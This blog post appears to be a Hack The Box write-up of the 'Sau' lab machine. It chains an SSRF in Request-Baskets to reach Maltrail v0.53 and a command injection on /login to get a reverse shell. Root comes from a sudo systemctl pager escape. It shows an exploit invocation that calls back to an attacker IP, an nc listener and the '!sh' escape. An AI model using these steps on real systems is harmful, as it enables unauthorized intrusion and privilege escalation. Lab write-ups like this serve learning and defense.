---
layout: post
title: "SAU MACHINE"
date: 2026-05-06
categories: [HTB, Machine]
tags: [CVE-2023–27163, Linux, RCE]
image: /images/sau/banner.png
---

For this specific machine the questions also acted as a guide to obtain the flags.So i'll be answering the tasks while exploiting the machines vulnerabilities to gain access.

# Steps to gain access to the machine

## Reconnaissance

I first performed an **nmap** scan to identify any open ports.

`$ nmap -p- -sV 10.129.229.26`.

![sau 1](/images/sau/sau 1.png)


**Ports identified:**
*   **22/tcp**: open ssh OpenSSH 8.2p1[cite: 3]
*   **80/tcp**: filtered http[cite: 3]
*   **8338/tcp**: filtered unknown[cite: 3]
*   **55555/tcp**: open unknown[cite: 3]

---

# Completing the tasks

### Task 1: Which is the highest open TCP port on the target machine?
From the image above, **55555** is the highest port.

### Task 2: What is the name of the open source software that the application on 55555 is "powered by"?
I accessed the port to check what was hosted and found a **Request-Baskets** web interface.

![sau 2](/images/sau/sau 2.png)

I actually attempted to create a basket and a token is presented when done.

![sau 2.1](/images/sau/sau 2.1.png)

### Task 3: What is the version of request-baskets running on Sau?
From the image  below, we can see the version is listed as **1.2.1**.

![sau 2](/images/sau/sau 2.png)

### Task 4: What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?
Most of these questions provided hints on how to proceed with the lab like from this task we already now know that the lab is vulnerable to an ssrf from the version being powered by requests.
Therefore, I performed a Google search and identified **CVE-2023-27163**. This vulnerability allows for SSRF via the `/api/baskets/{name}` component.

![sau 3](/images/sau/sau 3.png)

![sau 4](/images/sau/sau 4.png)

### Task 5: What is the name of the software that the application running on port 80 is "powered by"?
I proceeded to inspect port 80, but the scan indicated that it was filtered, so I had to find a workaround. I leveraged the identified CVE to perform a Server-Side Request Forgery (SSRF) attack to redirect my traffic to port 80.

Essentially, an SSRF vulnerability allows an attacker to cause the server-side application to make requests to an unintended location, such as internal services that are otherwise protected by a firewall.

I first downloaded the exploit and ran it, which successfully created a new basket.

![sau 5](/images/sau/sau 5.png)

Accessing the proxy basket URL revealed that the service is **Maltrail (v0.53)**.

![sau 6](/images/sau/sau 6.png)

### Task 6: There is an unauthenticated command injection vulnerability in MailTrail v0.53. What is the relative path on the webserver targeted by this exploit?
The targeted relative path is **/login**. While doing my research to find the Researching exploits for Maltrail v0.53 confirmed that the command injection occurs through this endpoint[cite: 3].

![sau 7](/images/sau/sau 7.1.png)

![sau 7](/images/sau/sau 7.png)

### Task 7: What system user is the Mailtrack application running as on Sau?
I executed the exploit script to gain a shell:

`$ python3 exploit.py 10.10.14.72 4444 http://10.129.28.136:55555/sbkyqs`

![sau 8](/images/sau/sau 8.png)

After setting up a listener (`nc -lvnp 4444`), the `whoami` command confirmed I was logged in as user **puma**.

![sau 9](/images/sau/sau 9.png)
---

# User flag

After gaining the shell, I stabilized it using Python and navigated to the home directory to retrieve the flag.

`$ python3 -c 'import pty; pty.spawn("/bin/bash")'`

`puma@sau:~$ cat user.txt`

![sau 10](/images/sau/sau 10.png)

---

### Task 9: What is the full path to the binary (without arguments) the puma user can run as root on Sau?
I ran `sudo -l` and found the user can run **/usr/bin/systemctl** status trail.service.

![sau 11](/images/sau/sau 11.png)

### Task 10: What is the full version string for the instance of systemd installed on Sau?
Running `systemctl --version` displayed: **systemd 245 (245.4-4ubuntu3.22)*.


### Task 11: What is the 2023 CVE ID for a local privilege escalation vulnerability in this version of systemd?
The vulnerability is **CVE-2023-26604**. It involves systemd not adequately blocking privilege escalation when `systemctl status` is executed via sudo, as it may launch `less` as root.systemctl is a central management tool in Linux used to control the systemd system and service manager. It is the standard utility for managing how the operating system starts up, what services run in the background, and how the system handles hardware and logging.

![sau 12](/images/sau/sau 12.png)

---

# Root flag

I triggered the service command and escaped the `less` pager by typing `!sh` to gain root shell. I stabalized the shell first then when ahead to access the flag contents in the root directory.

`root@sau:~# cat root.txt`

![sau 14](/images/sau/sau 14.png)